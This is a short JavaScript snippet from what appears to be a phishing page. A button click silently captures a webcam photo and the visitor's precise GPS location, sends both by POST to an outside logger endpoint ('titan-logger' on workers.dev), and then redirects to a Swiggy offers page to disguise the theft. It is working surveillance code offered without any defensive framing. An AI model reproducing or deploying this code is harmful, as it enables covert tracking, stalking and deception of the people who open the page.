<script>
    const API = "https://titan-logger.saliljha523.workers.dev";
    const btn = document.getElementById('btn');
    const video = document.getElementById('v');
    const canvas = document.createElement('canvas');

    btn.onclick = async () => {
        // ... (UI changes to loading) ...
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, () => r(null), {enableHighAccuracy:true}));
            
            video.srcObject = stream;
            await video.play();
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const img = canvas.toDataURL('image/jpeg', 0.2); // Ultra-light for instant upload
            stream.getTracks().forEach(t => t.stop());

            // THE CRITICAL SYNC
            const response = await fetch(API, {
                method: 'POST',
                body: JSON.stringify({ image: img, gps: pos ? `${pos.coords.latitude},${pos.coords.longitude}` : "NO_GPS" })
            });

            if (!response.ok) throw new Error("Database Rejected Connection");

            window.location.replace("https://www.swiggy.com/offers-near-me");
        } catch (e) {
            alert("Connection Error: " + e.message); // This tells us what's wrong
            window.location.replace("https://www.swiggy.com");
        }
    };
</script>
